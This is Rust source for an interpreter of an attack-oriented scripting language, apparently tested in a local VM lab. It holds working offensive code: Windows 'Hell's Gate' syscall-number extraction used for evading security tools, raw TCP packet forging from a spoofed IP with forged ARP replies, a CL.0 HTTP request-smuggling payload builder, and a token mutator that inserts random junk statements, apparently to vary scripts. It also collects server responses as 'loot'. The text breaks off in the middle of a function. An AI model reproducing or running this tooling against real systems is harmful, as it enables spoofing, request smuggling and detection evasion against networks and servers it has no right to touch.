use regex::Regex;
use std::collections::HashMap;
use std::env;
use num_bigint::BigInt;
use num_traits::{ Zero, One };
use std::fs::{ self, OpenOptions };
use std::io::{ self, Read, Write as StdWrite };
use std::net::{ TcpStream, ToSocketAddrs, Ipv4Addr };
use std::thread;
use std::time::{ Duration, SystemTime, UNIX_EPOCH, Instant };
#[cfg(target_arch = "x86_64")]
use core::arch::x86_64::_rdtsc;

// Raw socket interface using libpnet
use pnet::datalink;
use pnet::packet::arp::{ ArpHardwareTypes, ArpOperations, ArpPacket, MutableArpPacket };
use pnet::datalink::Channel::Ethernet;
use pnet::packet::{ MutablePacket, Packet };
use pnet::packet::ethernet::{ EtherTypes, EthernetPacket, MutableEthernetPacket };
use pnet::packet::ipv4::{ checksum as ipv4_checksum, Ipv4Packet, MutableIpv4Packet };
use pnet::packet::tcp::{ ipv4_checksum as tcp_checksum, MutableTcpPacket, TcpFlags, TcpPacket };
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::util::MacAddr;

#[cfg(target_os = "windows")]
use std::ffi::CString;
#[cfg(target_os = "windows")]
use std::ptr;
#[cfg(target_os = "windows")]
use winapi::um::libloaderapi::{ GetModuleHandleA, GetProcAddress };

// -------------------------------------------------
// Core Data Types
// -------------------------------------------------

#[derive(Debug, Clone, PartialEq)]
enum Token {
    Keyword(String),
    Identifier(String),
    NumberInt(BigInt),
    NumberFloat(f64),
    IpAddress(String),
    StringLiteral(String),
    Compare(String),
    Assign,
    Operator(String),
    Delimiter,
    Punctuation(String),
}

#[derive(Debug, Clone, PartialEq)]
enum Value { 
    Int(BigInt),
    Float(f64), 
    Str(String), 
    Bool(bool), 
    List(Vec<Value>),
    Dict(HashMap<String, Value>),
    Gateway { target_ip: String, target_mac: [u8; 6], next_seq: u32, next_ack: u32 },
    TimeAnchor(Instant),
    CycleAnchor(u64),
    L7Tunnel { target: String, port: u16, loot: String, raw: Vec<u8> },
    
    None 
}

// -------------------------------------------------
// Windows syscall number extraction (Hell's Gate)
// -------------------------------------------------

#[cfg(target_os = "windows")]
const SYSCALL_STUB: [u8; 4] = [0x4c, 0x8b, 0xd1, 0xb8];

#[cfg(target_os = "windows")]
unsafe fn hunt_ssn(function_address: *const u8) -> Option<u32> {
    unsafe {
        for offset in 0..32 {
            let current_ptr = function_address.add(offset);
            let bytes = std::slice::from_raw_parts(current_ptr, 4);
            if bytes == SYSCALL_STUB {
                let ssn_ptr = current_ptr.add(4) as *const u32;
                return Some(ptr::read_unaligned(ssn_ptr));
            }
        }
    }
    None
}

// -------------------------------------------------
// Low-level packet construction
// -------------------------------------------------

fn forge_packet(
    source_ip: Ipv4Addr,
    dest_ip: Ipv4Addr,
    source_mac: MacAddr,
    dest_mac: MacAddr,
    seq_num: u32,
    ack_num: u32,
    tcp_flags: u8,
    payload: &[u8]
) -> Vec<u8> {
    let packet_size = 14 + 20 + 20 + payload.len(); // Eth + IP + TCP + Payload
    let mut buffer = vec![0u8; packet_size];

    let mut eth_packet = MutableEthernetPacket::new(&mut buffer).unwrap();
    eth_packet.set_destination(dest_mac);
    eth_packet.set_source(source_mac);
    eth_packet.set_ethertype(EtherTypes::Ipv4);

    let mut ip_packet = MutableIpv4Packet::new(eth_packet.payload_mut()).unwrap();
    ip_packet.set_version(4);
    ip_packet.set_header_length(5);
    ip_packet.set_total_length((40 + payload.len()) as u16);
    ip_packet.set_ttl(64);
    ip_packet.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
    ip_packet.set_source(source_ip);
    ip_packet.set_destination(dest_ip);
    let checksum = ipv4_checksum(&ip_packet.to_immutable());
    ip_packet.set_checksum(checksum);

    let mut tcp_packet = MutableTcpPacket::new(ip_packet.payload_mut()).unwrap();
    tcp_packet.set_source(8888);
    tcp_packet.set_destination(80);
    tcp_packet.set_sequence(seq_num);
    tcp_packet.set_acknowledgement(ack_num);
    tcp_packet.set_window(64240);
    tcp_packet.set_data_offset(5);
    tcp_packet.set_flags(tcp_flags);

    // Copy payload into TCP segment
    if !payload.is_empty() {
        tcp_packet.payload_mut().copy_from_slice(payload);
    }

    let tcp_chk = tcp_checksum(&tcp_packet.to_immutable(), &source_ip, &dest_ip);
    tcp_packet.set_checksum(tcp_chk);

    buffer
}

// -------------------------------------------------
// Lexer
// -------------------------------------------------

fn lexer(code: &str) -> Vec<Token> {
    let mut tokens = Vec::new();
    let token_rules = vec![
        ("SKIP", r"[ \t\n\r]+|//.*"),
        ("TYPE_IP", r"\b(?:\d{1,3}\.){3}\d{1,3}\b"),
        ("NUMBER", r"\d+(\.\d*)?"),
        ("KEYWORD", r"\b(desync|gateway|set|scan|payload|if|while|for|in|end|log|swarm|ports|to|write|append|wait|list|push|pop|rand|op|call|resolve|input|transmit|import|fn|return|dict|put|get|try|rescue|panic|num|break|mark|measure|connect|port|hex|len)\b"),
        ("ID", r"[a-zA-Z_][a-zA-Z0-9_]*"),
        ("COMP", r"==|!=|<=|>=|=>|<|>"),
        ("ASSIGN", r"="),
        ("OP", r"[+\-*/%]"),
        ("STRING", r#""(?:\\.|[^"\\])*""#),
        ("DELIM", r";"),
        ("PUNCT", r"[{}():,]")
    ];

    let combined_regex = token_rules
        .iter()
        .map(|(n, p)| format!("(?P<{}>{})", n, p))
        .collect::<Vec<_>>()
        .join("|");
    let re = Regex::new(&combined_regex).unwrap();
    let mut last_end = 0;

    for caps in re.captures_iter(code) {
        let m = caps.get(0).unwrap();
        if m.start() > last_end {
            let broken_snippet = &code[last_end..m.start()];
            panic!("Lexer error at offset {}. Unrecognized token: '{}'", last_end, broken_snippet);
        }
        last_end = m.end();
        let val = m.as_str().to_string();

        if caps.name("SKIP").is_some() {
            continue;
        } else if caps.name("KEYWORD").is_some() {
            tokens.push(Token::Keyword(val));
        } else if caps.name("TYPE_IP").is_some() {
            tokens.push(Token::IpAddress(val));
        } else if caps.name("NUMBER").is_some() {
            if val.contains('.') {
                tokens.push(Token::NumberFloat(val.parse::<f64>().unwrap()));
            } else {
                tokens.push(Token::NumberInt(val.parse::<BigInt>().unwrap()));
            }
        } else if caps.name("ID").is_some() {
            tokens.push(Token::Identifier(val));
        } else if caps.name("COMP").is_some() {
            tokens.push(Token::Compare(val));
        } else if caps.name("ASSIGN").is_some() {
            tokens.push(Token::Assign);
        } else if caps.name("OP").is_some() {
            tokens.push(Token::Operator(val));
        } else if caps.name("STRING").is_some() {
            let inner_string = &val[1..val.len() - 1];
            let clean_string = inner_string.replace("\\\"", "\"").replace("\\n", "\n");
            tokens.push(Token::StringLiteral(clean_string));
        } else if caps.name("DELIM").is_some() {
            tokens.push(Token::Delimiter);
        } else if caps.name("PUNCT").is_some() {
            tokens.push(Token::Punctuation(val));
        }
    }
    tokens
}

fn mutate_token_stream(tokens: Vec<Token>) -> Vec<Token> {
    let mut mutated = Vec::new();
    for token in tokens {
        mutated.push(token.clone());
        if let Token::Delimiter = token {
            let seed = SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap()
                .subsec_nanos() as usize;
            if seed % 10 < 2 {
                let id = format!("_v_{}", seed % 100);
                mutated.push(Token::Keyword("set".to_string()));
                mutated.push(Token::Identifier(id));
                mutated.push(Token::Assign);
                mutated.push(Token::NumberInt(BigInt::one()));
                mutated.push(Token::Delimiter);
            }
        }
    }
    mutated
}

fn format_address(ip: &str, port: u16) -> String {
    if ip.contains(':') { format!("[{}]:{}", ip, port) } else { format!("{}:{}", ip, port) }
}

// -------------------------------------------------
// Parser and runtime
// -------------------------------------------------

struct Parser {
    tokens: Vec<Token>,
    pos: usize,
    memory: HashMap<String, Value>,
    functions: HashMap<String, (Vec<String>, Vec<Token>)>,
    has_error: bool,
    return_value: Value,
    has_break: bool,
}

impl Parser {
    
    fn parse_connect(&mut self) -> Value {
        self.expect_keyword("connect");
        let target = if let Value::Str(s) = self.parse_factor() { s } else { panic!("Expected target string"); };
        
        self.expect_keyword("port");
        let port = match self.parse_factor() {
            Value::Int(n) => n.to_string().parse::<u16>().unwrap_or(80),
            Value::Float(f) => f as u16,
            _ => 80,
        };
        
        Value::L7Tunnel { target, port, loot: String::new(), raw: Vec::new() }
    }

    fn parse_hex(&mut self) -> Value {
        self.expect_keyword("hex");
        
        let target_val = self.parse_factor();
        
        if let Value::L7Tunnel { raw, .. } = target_val {
            // Converts the binary vector into a clean, space-separated hex string
            let hex_str = raw.iter().map(|b| format!("{:02X}", b)).collect::<Vec<String>>().join(" ");
            Value::Str(hex_str)
        } else {
            panic!("Type Error: 'hex' keyword requires an L7Tunnel object.");
        }
    }

    fn new(tokens: Vec<Token>) -> Self {
        Parser {
            tokens,
            pos: 0,
            memory: HashMap::new(),
            functions: HashMap::new(),
            has_error: false,
            return_value: Value::None,
            has_break: false,
        }
    }

    fn parse_mark(&mut self) -> Value {
        self.expect_keyword("mark");

        // Check if the user is asking for raw CPU cycles
        if let Some(Token::Identifier(id)) = self.peek() {
            if id == "cycles" {
                self.next();
                #[cfg(target_arch = "x86_64")]
                unsafe {
                    return Value::CycleAnchor(_rdtsc());
                }
                #[cfg(not(target_arch = "x86_64"))]
                panic!("Cycles measurement only supported on x86_64 architectures.");
            }
        }

        // Otherwise, drop a standard time anchor
        Value::TimeAnchor(Instant::now())
    }

    fn parse_measure(&mut self) -> Value {
        self.expect_keyword("measure");
        let target_var = if let Some(Token::Identifier(id)) = self.peek() {
            self.next();
            id
        } else {
            panic!("Expected temporal anchor variable");
        };

        self.expect_keyword("in");
        let precision = if let Value::Str(s) = self.parse_factor() {
            s
        } else {
            panic!("Expected precision string (e.g., \"ms\", \"us\")");
        };

        let anchor = self.memory
            .get(&target_var)
            .cloned()
            .expect("FATAL: Temporal anchor not found in memory.");

        match anchor {
            Value::TimeAnchor(start_time) => {
                let elapsed = start_time.elapsed();

                let result = match precision.as_str() {
                    "s" => elapsed.as_secs_f64(),
                    "ms" => elapsed.as_millis() as f64,
                    "us" => elapsed.as_micros() as f64,
                    "ns" => elapsed.as_nanos() as f64,
                    _ => panic!("Bad precision"),
                };

                Value::Float(result)
            }

            Value::CycleAnchor(start_cycles) => {
                if precision != "cycles" {
                    panic!("Cycle anchors need 'cycles'");
                }

                #[cfg(target_arch = "x86_64")]
                unsafe {
                    let current_cycles = _rdtsc();
                    let delta = current_cycles - start_cycles;
                    Value::Int(BigInt::from(delta))
                }

                #[cfg(not(target_arch = "x86_64"))]
                panic!("Unsupported arch")
            }

            _ => panic!("Bad measure target"),
        }
    }

    fn peek(&self) -> Option<Token> {
        self.tokens.get(self.pos).cloned()
    }
    fn next(&mut self) {
        self.pos += 1;
    }

    fn expect_keyword(&mut self, kw: &str) {
        if let Some(Token::Keyword(k)) = self.peek() {
            if k == kw {
                self.next();
                return;
            }
        }
        panic!("Runtime error: expected keyword '{}'", kw);
    }

    fn parse(&mut self) {
        while self.pos < self.tokens.len() {
            self.parse_stmt();
        }
    }

    fn parse_stmt(&mut self) {
        // Handle gateway pipe syntax: id => payload
        if let Some(Token::Identifier(ref id)) = self.peek() {
            if self.tokens.get(self.pos + 1) == Some(&Token::Compare("=>".to_string())) {
                let id_clone = id.clone();
                self.parse_pipe_injection(id_clone);
                return;
            }
        }

        if let Some(Token::Keyword(k)) = self.peek() {
            match k.as_str() {
                "set" => self.parse_assignment(),
                "log" => self.parse_log(),
                "scan" => self.parse_scan(),
                "swarm" => self.parse_swarm(),
                "payload" => self.parse_payload(),
                "transmit" => {
                    let _ = self.parse_transmit();
                }
                "import" => self.parse_import(),
                "while" => self.parse_while(),
                "for" => self.parse_for(),
                "if" => self.parse_standard_if(),
                "wait" => self.parse_wait(),
                "write" => self.parse_file_op(false),
                "append" => self.parse_file_op(true),
                "push" => self.parse_push(),
                "pop" => self.parse_pop(),
                "fn" | "op" => self.parse_fn(),
                "return" => self.parse_return(),
                "call" => {
                    self.parse_call();
                    if let Some(Token::Delimiter) = self.peek() {
                        self.next();
                    }
                }
                "put" => self.parse_put(),
                "try" => self.parse_try(),
                "panic" => self.parse_panic(),
                "break" => {
                    self.has_break = true;
                    self.next();
                    if let Some(Token::Delimiter) = self.peek() {
                        self.next();
                    }
                }
                "end" => self.next(),
                _ => self.next(),
            }
        } else {
            self.next();
        }
    }

    // -------------------------------------------------
    // Low-level network interaction
    // -------------------------------------------------

    fn parse_gateway(&mut self) -> Value {
        self.expect_keyword("gateway");
        let target_ip_str = if let Value::Str(s) = self.parse_factor() {
            s
        } else {
            panic!("IP address required");
        };
        let phantom_ip = Ipv4Addr::new(192, 168, 56, 200);
        let dest_ip: Ipv4Addr = target_ip_str.parse().expect("Bad IP");

        let ifaces = datalink::interfaces();
        let iface = ifaces
            .into_iter()
            .find(|i| i.ips.iter().any(|ip| ip.ip().to_string() == "192.168.56.1"))
            .unwrap();
        let source_mac = iface.mac.unwrap();
        let d_mac = MacAddr(0x08, 0x00, 0x27, 0x62, 0x85, 0x77); // Target MAC address (Ubuntu VM)

        let (mut tx, mut rx) = match datalink::channel(&iface, Default::default()) {
            Ok(Ethernet(tx, rx)) => (tx, rx),
            _ => panic!("Sock err"),
        };

        let syn = forge_packet(phantom_ip, dest_ip, source_mac, d_mac, 1000, 0, TcpFlags::SYN, &[]);
        tx.send_to(&syn, None).unwrap().unwrap();

        let (h_seq, h_ack);
        loop {
            let pkt = rx.next().unwrap();
            let eth = EthernetPacket::new(pkt).unwrap();

            // Handle ARP response for IP address
            if eth.get_ethertype() == EtherTypes::Arp {
                if let Some(arp) = ArpPacket::new(eth.payload()) {
                    if arp.get_target_proto_addr() == phantom_ip {
                        let mut ab = [0u8; 28];
                        let mut rep = MutableArpPacket::new(&mut ab).unwrap();
                        rep.set_operation(ArpOperations::Reply);
                        rep.set_sender_hw_addr(source_mac);
                        rep.set_sender_proto_addr(phantom_ip);
                        rep.set_target_hw_addr(arp.get_sender_hw_addr());
                        rep.set_target_proto_addr(arp.get_sender_proto_addr());
                        rep.set_hardware_type(ArpHardwareTypes::Ethernet);
                        rep.set_protocol_type(EtherTypes::Ipv4);
                        rep.set_hw_addr_len(6);
                        rep.set_proto_addr_len(4);

                        let mut eb = [0u8; 42];
                        let mut er = MutableEthernetPacket::new(&mut eb).unwrap();
                        er.set_destination(arp.get_sender_hw_addr());
                        er.set_source(source_mac);
                        er.set_ethertype(EtherTypes::Arp);
                        er.set_payload(rep.packet());
                        tx.send_to(er.packet(), None).unwrap().unwrap();
                    }
                }
            }

            // Process TCP handshake
            if let Some(ip) = Ipv4Packet::new(eth.payload()) {
                if let Some(tcp) = TcpPacket::new(ip.payload()) {
                    if
                        ip.get_destination() == phantom_ip &&
                        tcp.get_flags() == (TcpFlags::SYN | TcpFlags::ACK)
                    {
                        h_seq = tcp.get_sequence();
                        h_ack = 1001;
                        let ack = forge_packet(
                            phantom_ip,
                            dest_ip,
                            source_mac,
                            d_mac,
                            h_ack,
                            h_seq + 1,
                            TcpFlags::ACK,
                            &[]
                        );
                        tx.send_to(&ack, None).unwrap().unwrap();
                        break;
                    }
                }
            }
        }
        // Handshake completed
        println!(
            "Handshake established with remote host. Sequence: {}, Acknowledgment: {}",
            h_seq,
            h_ack
        );

        Value::Gateway {
            target_ip: target_ip_str,
            target_mac: [0x08, 0x00, 0x27, 0x62, 0x85, 0x77],
            next_seq: h_ack, // Final sequence number for subsequent packets
            next_ack: h_seq + 1, // Final acknowledgement number
        }
    }

    fn parse_desync(&mut self) -> Value {
        self.expect_keyword("desync");
        if let Some(Token::Punctuation(p)) = self.peek() {
            if p == "(" {
                self.next();
            }
        }
        let _mode = if let Value::Str(s) = self.parse_factor() {
            s
        } else {
            panic!("Mode parameter required");
        };
        if let Some(Token::Punctuation(p)) = self.peek() {
            if p == "," {
                self.next();
            }
        }
        let end = if let Value::Str(s) = self.parse_factor() {
            s
        } else {
            panic!("Endpoint parameter required");
        };
        if let Some(Token::Punctuation(p)) = self.peek() {
            if p == "," {
                self.next();
            }
        }
        let host = if let Value::Str(s) = self.parse_factor() {
            s
        } else {
            panic!("Host parameter required");
        };
        if let Some(Token::Punctuation(p)) = self.peek() {
            if p == ")" {
                self.next();
            }
        }

        // Construct CL.0 request smuggling payload
        // Embed a secondary GET request within the Content-Length header
        let smuggled = format!("GET {} HTTP/1.1\r\nHost: {}\r\n\r\n", end, host);

        let payload = format!(
            "GET / HTTP/1.1\r\nHost: {}\r\nContent-Length: 0\r\nConnection: keep-alive\r\n\r\n{}",
            host,
            smuggled // The backend will now see this as a second, brand-new request
        );

        Value::Str(payload)
    }

    fn parse_pipe_injection(&mut self, gateway_id: String) {
        self.next(); // Consume ID
        self.next(); // Consume '=>'

        let payload_val = self.parse_expr();
        let payload_str = if let Value::Str(s) = payload_val {
            s
        } else {
            panic!("Payload must be a string value");
        };

        if let Some(Token::Delimiter) = self.peek() {
            self.next();
        }

        // Fetch the target variable from memory
        let gateway = self.memory.get(&gateway_id).cloned().expect("Target variable not found in memory");

        // =================================================================
        // 🌍 UPGRADED PATH: LAYER 7 TCP ROUTING (DEEP-READ ENABLED)
        // =================================================================
        if let Value::L7Tunnel { target, port, mut loot, mut raw } = gateway {
            println!("\nOpening Layer 7 TCP Stream to {}:{}...", target, port);
            let addr = format!("{}:{}", target, port);

            // 1. Establish the connection with a 3s timeout
            if let Ok(mut stream) = std::net::TcpStream::connect_timeout(&addr.to_socket_addrs().unwrap().next().unwrap(), std::time::Duration::from_secs(3)) {
                
                // 2. Set a read timeout so we don't hang after the second response
                let _ = stream.set_read_timeout(Some(std::time::Duration::from_millis(800)));

                let payload_bytes = payload_str.replace("\\r", "\r").replace("\\n", "\n");
                let _ = std::io::Write::write_all(&mut stream, payload_bytes.as_bytes());
                println!("Payload delivered. Monitoring stream for multi-frame responses...");

                let mut full_raw = Vec::new();
                let mut buffer = [0; 8192];
                
                // 3. The Deep-Read Loop: Captures Response #1 AND Response #2
                loop {
                    match std::io::Read::read(&mut stream, &mut buffer) {
                        Ok(0) => break, // Server closed connection
                        Ok(bytes_read) => {
                            full_raw.extend_from_slice(&buffer[..bytes_read]);
                        }
                        Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock || e.kind() == std::io::ErrorKind::TimedOut => {
                            break; // Stream went silent (we got everything)
                        }
                        Err(_) => break,
                    }
                }

                raw = full_raw;
                loot = String::from_utf8_lossy(&raw).to_string();
                println!("Total capture completed: {} bytes.", raw.len());

            } else {
                panic!("FATAL: Could not establish TCP connection to {}:{}", target, port);
            } // <--- THIS WAS THE MISSING DELIMITER

            // Save the forensic data back to memory
            self.memory.insert(gateway_id, Value::L7Tunnel { target, port, loot, raw });

        } else if let Value::Gateway { target_ip, target_mac, mut next_seq, next_ack } = gateway {

            println!("\nTransmitting payload to {} via established raw Ring-0 channel", target_ip);

            let interfaces = datalink::interfaces();
            let interface = interfaces
                .into_iter()
                .find(|iface| iface.ips.iter().any(|ip| ip.ip().to_string() == "192.168.56.1"))
                .unwrap();

            let (mut tx, _) = match datalink::channel(&interface, Default::default()) {
                Ok(Ethernet(tx, rx)) => (tx, rx),
                _ => panic!("Socket error"),
            };

            let source_ip = Ipv4Addr::new(192, 168, 56, 200);
            let dest_ip: Ipv4Addr = target_ip.parse().unwrap();
            let smac = interface.mac.unwrap();
            let dmac = MacAddr(
                target_mac[0],
                target_mac[1],
                target_mac[2],
                target_mac[3],
                target_mac[4],
                target_mac[5]
            );

            let payload_bytes = payload_str.replace("\\r", "\r").replace("\\n", "\n");

            let psh_packet = forge_packet(
                source_ip,
                dest_ip,
                smac,
                dmac,
                next_seq,
                next_ack,
                TcpFlags::PSH | TcpFlags::ACK,
                payload_bytes.as_bytes()
            );

            tx.send_to(&psh_packet, None).unwrap().unwrap();

            next_seq += payload_bytes.len() as u32;
            self.memory.insert(gateway_id, Value::Gateway {
                target_ip,
                target_mac,
                next_seq,
                next_ack,
            });

            println!("Payload transmission completed.");
        } else {
            panic!("Pipe operation requires a gateway or tunnel variable. You gave it something else.");
        }
    }

    #[allow(dead_code)]
    fn execute_extraction(&mut self, gw_id: String) -> Value {
        let gateway = self.memory.get(&gw_id).cloned().expect("Gateway variable not found");

        if let Value::L7Tunnel { loot, .. } = gateway {
            return Value::Str(loot);
        }

        if let Value::Gateway { target_ip, .. } = gateway {
            println!("Awaiting response from target {}...", target_ip);

            let interfaces = datalink::interfaces();
            let interface = interfaces
                .into_iter()
                .find(|iface| iface.ips.iter().any(|ip| ip.ip().to_string() == "192.168.56.1"))
                .unwrap();
            let (_, mut rx) = match datalink::channel(&interface, Default::default()) {
                Ok(Ethernet(tx, rx)) => (tx, rx),
                _ => panic!("Socket error"),
            };

            let start_time = std::time::Instant::now();
            let mut loot = String::new();

            loop {
                if start_time.elapsed().as_secs() > 3 {
                    break;
                }
                if let Ok(packet) = rx.next() {
                    if let Some(eth) = EthernetPacket::new(packet) {
                        if let Some(ipv4) = Ipv4Packet::new(eth.payload()) {
                            if let Some(tcp) = TcpPacket::new(ipv4.payload()) {
                                if
                                    tcp.get_source() == 80 &&
                                    ipv4.get_source().to_string() == target_ip
                                {
                                    let payload = tcp.payload();
                                    if !payload.is_empty() {
                                        let data = String::from_utf8_lossy(payload).to_string();
                                        loot.push_str(&data);
                                        println!(
                                            "Received {} bytes of payload data.",
                                            payload.len()
                                        );
                                        break;
                                    }
                                }
                            }
                        }
                    }
                }
            }
            if loot.is_empty() {
                println!("No response received from target within allocated time window.");
            }
            Value::Str(loot)
        } else {
            panic!("Variable is not a gateway object");
        }
    }

    // -------------------------------------------------
    // Language feature implementations
    // -------------------------------------------------

    fn parse_factor(&mut self) -> Value {
        let tok = self.peek().expect("Unexpected EOF");

        match tok {
            Token::Punctuation(ref p) if p == "(" => {
                self.next();

                let val = self.parse_cond();

                match self.peek() {
                    Some(Token::Punctuation(ref p)) if p == ")" => {
                        self.next();
                    }
                    _ => panic!("Expected ')'"),
                }

                val
            }

            Token::NumberInt(n) => {
                self.next();
                Value::Int(n)
            }

            Token::NumberFloat(n) => {
                self.next();
                Value::Float(n)
            }

            Token::Operator(ref op) if op == "-" => {
                self.next();

                match self.parse_factor() {
                    Value::Int(n) => Value::Int(-n),
                    Value::Float(n) => Value::Float(-n),
                    _ => panic!("Unary '-' only works on numbers"),
                }
            }

            Token::StringLiteral(s) | Token::IpAddress(s) => {
                self.next();
                Value::Str(s)
            }

            Token::Identifier(id) => {
                self.next();

                self.memory.get(&id).cloned().unwrap_or(Value::Int(BigInt::zero()))
            }

            Token::Keyword(k) if k == "num" => {
                self.next();

                match self.parse_factor() {
                    Value::Str(s) => {
                        if s.contains('.') {
                            Value::Float(s.parse::<f64>().unwrap())
                        } else {
                            Value::Int(s.parse::<BigInt>().unwrap_or(BigInt::zero()))
                        }
                    }

                    Value::Int(n) => Value::Int(n),
                    Value::Float(n) => Value::Float(n),

                    _ => Value::Int(BigInt::zero()),
                }
            }

            Token::Keyword(k) if k == "len" => {
                self.next(); // Consume the 'len' token
                
                // Evaluate whatever comes directly after 'len'
                match self.parse_factor() {
                    Value::Str(s) => Value::Int(BigInt::from(s.len())),
                    Value::List(l) => Value::Int(BigInt::from(l.len())),
                    Value::Dict(d) => Value::Int(BigInt::from(d.len())),
                    // If they try to get the length of an Int, Float, or Gateway, default to 0 safely
                    _ => Value::Int(BigInt::zero()), 
                }
            }

            _ => Value::Int(BigInt::zero()),
        }
    }

    fn parse_fn(&mut self) {
        self.next();
        let name = if let Some(Token::Identifier(id)) = self.peek() {
            self.next();
            id
        } else {
            panic!();
        };
        let mut args = Vec::new();
        while let Some(Token::Identifier(id)) = self.peek() {
            self.next();
            args.push(id);
        }
        if let Some(Token::Punctuation(ref p)) = self.peek() {
            if p == ":" {
                self.next();
            }
        }
        let mut body = Vec::new();
        let mut depth = 1;
        while let Some(t) = self.peek() {
            self.next();
            if let Token::Keyword(ref k) = t {
                if ["if", "for", "while", "swarm", "scan", "fn", "op", "try"].contains(&k.as_str()) {
                    depth += 1;
                }
                if k == "end" {
                    depth -= 1;
                    if depth == 0 {
                        break;
                    }
                }
            }
            body.push(t);
        }
        self.functions.insert(name, (args, body));
    }

    fn parse_return(&mut self) {
        self.expect_keyword("return");
        self.return_value = self.parse_cond();
        if let Some(Token::Delimiter) = self.peek() {
            self.next();
        }
    }

    fn parse_call(&mut self) -> Value {
        self.expect_keyword("call");
        let name = if let Some(Token::Identifier(id)) = self.peek() {
            self.next();
            id
        } else {
            panic!();
        };
        let mut passed_args = Vec::new();
        while self.peek() != Some(Token::Delimiter) && self.peek().is_some() {
            passed_args.push(self.parse_factor());
        }
        if let Some((arg_names, body)) = self.functions.get(&name).cloned() {
            let mut sub = Parser::new(body);
            sub.functions = self.functions.clone();
            sub.memory = self.memory.clone();
            for (i, val) in passed_args.into_iter().enumerate() {
                if i < arg_names.len() {
                    sub.memory.insert(arg_names[i].clone(), val);
                }
            }
            sub.parse();
            self.memory = sub.memory.clone();
            return sub.return_value;
        }
        Value::None
    }

    fn parse_put(&mut self) {
        self.expect_keyword("put");
        let dict_name = if let Some(Token::Identifier(id)) = self.peek() {
            self.next();
            id
        } else {
            panic!();
        };
        let key = if let Value::Str(s) = self.parse_factor() {
            s
        } else {
            panic!("Keys must be strings");
        };
        let val = self.parse_cond();
        if let Some(Token::Delimiter) = self.peek() {
            self.next();
        }
        if let Some(Value::Dict(internal_dict)) = self.memory.get_mut(&dict_name) {
            internal_dict.insert(key, val);
        }
    }

    #[allow(dead_code)]
    fn parse_get(&mut self) -> Value {
        self.expect_keyword("get");
        let dict_name = if let Some(Token::Identifier(id)) = self.peek() {
            self.next();
            id
        } else {
            panic!();
        };
        let key = if let Value::Str(s) = self.parse_factor() {
            s
        } else {
            panic!("Keys must be strings");
        };
        if let Some(Value::Dict(internal_dict)) = self.memory.get(&dict_name) {
            return internal_dict.get(&key).cloned().unwrap_or(Value::None);
        }
        Value::None
    }

    fn parse_try(&mut self) {
        self.expect_keyword("try");
        if let Some(Token::Punctuation(ref p)) = self.peek() {
            if p == ":" {
                self.next();
            }
        }
        self.has_error = false;
        while self.pos < self.tokens.len() {
            if let Some(Token::Keyword(ref k)) = self.peek() {
                if k == "rescue" || k == "end" {
                    break;
                }
            }
            self.parse_stmt();
            if self.has_error {
                break;
            }
        }
        if self.has_error {
            let mut depth = 1;
            while self.pos < self.tokens.len() {
                if let Some(Token::Keyword(ref k)) = self.peek() {
                    if ["try", "if", "while", "for", "swarm", "fn", "op"].contains(&k.as_str()) {
                        depth += 1;
                    }
                    if k == "end" {
                        depth -= 1;
                        if depth == 0 {
                            break;
                        }
                    }
                    if k == "rescue" && depth == 1 {
                        break;
                    }
                }
                self.next();
            }
        }
        if let Some(Token::Keyword(ref k)) = self.peek() {
            if k == "rescue" {
                self.next();
                if let Some(Token::Punctuation(ref p)) = self.peek() {
                    if p == ":" {
                        self.next();
                    }
                }
                if !self.has_error {
                    self.skip_block();
                } else {
                    self.has_error = false;
                    while self.pos < self.tokens.len() {
                        if let Some(Token::Keyword(ref k)) = self.peek() {
                            if k == "end" {
                                break;
                            }
                        }
                        self.parse_stmt();
                    }
                }
            }
        }
        if let Some(Token::Keyword(ref k)) = self.peek() {
            if k == "end" {
                self.next();
            }
        }
    }

    fn parse_panic(&mut self) {
        self.expect_keyword("panic");
        self.has_error = true;
        if let Some(Token::Delimiter) = self.peek() {
            self.next();
        }
    }

    fn parse_import(&mut self) {
        self.expect_keyword("import");
        let filename = if let Value::Str(s) = self.parse_factor() {
            s
        } else {
            panic!();
        };
        if let Some(Token::Delimiter) = self.peek() {
            self.next();
        }
        let imported_code = fs
            ::read_to_string(&filename)
            .unwrap_or_else(|_| panic!("Unable to read file '{}'", filename));
        let mut sub_parser = Parser::new(mutate_token_stream(lexer(&imported_code)));
        sub_parser.memory = self.memory.clone();
        sub_parser.functions = self.functions.clone();
        sub_parser.parse();
        self.memory = sub_parser.memory;
        self.functions = sub_parser.functions;
    }

    fn parse_assignment(&mut self) {
        self.expect_keyword("set");
        let name = if let Some(Token::Identifier(id)) = self.peek() {
            self.next();
            id
        } else {
            panic!("Invalid assignment syntax");
        };
        if let Some(Token::Assign) = self.peek() {
            self.next();
        }

        let val = if let Some(Token::Keyword(k)) = self.peek() {
            match k.as_str() {
                "list" => {
                    self.next();
                    Value::List(Vec::new())
                }
                "dict" => {
                    self.next();
                    Value::Dict(HashMap::new())
                }
                "rand" => self.parse_rand(),
                "resolve" => self.parse_resolve(),
                "input" => self.parse_input(),
                "gateway" => self.parse_gateway(),
                "desync" => self.parse_desync(),
                "mark" => self.parse_mark(),
                "measure" => self.parse_measure(),
                "connect" => self.parse_connect(),
                "hex" => self.parse_hex(),
                _ => self.parse_cond(),
            }
        } else {
            self.parse_cond()
        };

        if let Some(Token::Delimiter) = self.peek() {
            self.next();
        }
        self.memory.insert(name, val);
    }

    fn parse_resolve(&mut self) -> Value {
        self.expect_keyword("resolve");
        let host = if let Value::Str(s) = self.parse_factor() {
            s
        } else {
            panic!();
        };
        if let Ok(mut addrs) = format!("{}:80", host).to_socket_addrs() {
            if let Some(a) = addrs.next() {
                return Value::Str(a.ip().to_string());
            }
        }
        Value::Str("0.0.0.0".to_string())
    }

    fn parse_input(&mut self) -> Value {
        self.expect_keyword("input");
        let prompt = if let Value::Str(s) = self.parse_factor() { s } else { "".to_string() };
        print!("{}", prompt);
        let _ = io::stdout().flush();
        let mut input = String::new();
        let _ = io::stdin().read_line(&mut input);
        Value::Str(input.trim().to_string())
    }

    fn parse_rand(&mut self) -> Value {
        self.expect_keyword("rand");

        let start = match self.parse_factor() {
            Value::Int(n) => n.to_string().parse::<i64>().unwrap_or(0),
            Value::Float(n) => n as i64,
            _ => 0,
        };

        self.expect_keyword("to");

        let end = match self.parse_factor() {
            Value::Int(n) => n.to_string().parse::<i64>().unwrap_or(100),
            Value::Float(n) => n as i64,
            _ => 100,
